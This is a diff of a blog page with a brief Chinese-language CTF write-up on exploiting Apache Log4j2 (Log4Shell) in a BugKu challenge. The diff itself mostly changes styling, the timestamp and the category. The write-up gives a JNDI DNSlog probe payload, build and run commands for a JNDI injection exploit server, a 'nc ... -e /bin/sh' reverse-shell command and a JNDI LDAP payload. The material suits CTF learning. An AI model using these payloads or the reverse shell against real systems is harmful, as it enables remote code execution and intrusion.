@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -240,16 +248,16 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：4 个月前
+                  本文最后更新于：22 分钟前
                 
               </p>
             
             <div class="markdown-body">
               <h2 id="Apache-Log4j2-RCE"><a href="#Apache-Log4j2-RCE" class="headerlink" title="Apache Log4j2 RCE"></a>Apache Log4j2 RCE</h2><p>BugKu:<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291933557.png" srcset="/img/loading.gif"><br>先dnslog看看<br><code>$&#123;jndi:ldap://hhkzdj.dnslog.cn&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291934351.png" srcset="/img/loading.gif"><br>有回显，所以存在<code>Log4j2</code></p>
 <p>需要先在自己VPS上搭建一个JNDI服务<br><code>Github: https://github.com/welk1n/JNDI-Injection-Exploit</code><br>git clone 下来</p>
-<div class="hljs"><pre><code>1.cd JNDI-Injection-Exploit
+<pre><code>1.cd JNDI-Injection-Exploit
 2.mvn clean package -DskipTests     //这一步报错的话直接下载作者给的jar包也行
-3.java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;命令&quot; -A &quot;VPS_IP&quot;    //开启服务</code></pre></div>
+3.java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;命令&quot; -A &quot;VPS_IP&quot;    //开启服务</code></pre>
 <p><code>java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc xxx.xxx.xxx.xxx 9999 -e /bin/sh&quot; -A xxx.xxx.xxx.xxx</code></p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291941336.png" srcset="/img/loading.gif"><br>选择一个<code>JNDI Links</code><br>如：<code>ldap://120.76.136.64:1389/idzbzl</code><br>payload:<code>$&#123;jndi:ldap://120.76.136.64:1389/idzbzl&#125;</code><br>监听端口即可</p>
 <p>参考：<a target="_blank" rel="noopener" href="http://vfree.ltd/index.php/archives/386.html">http://vfree.ltd/index.php/archives/386.html</a><br>    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ktsm/p/15695560.html">https://www.cnblogs.com/ktsm/p/15695560.html</a></p>
@@ -262,9 +270,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/wp/">wp</a>
+                      <a class="hover-with-bg" href="/categories/CVE/">CVE</a>
                     
                   </div>
                 
@@ -410,6 +416,8 @@
 
 
 
+  
+    
   
 
 
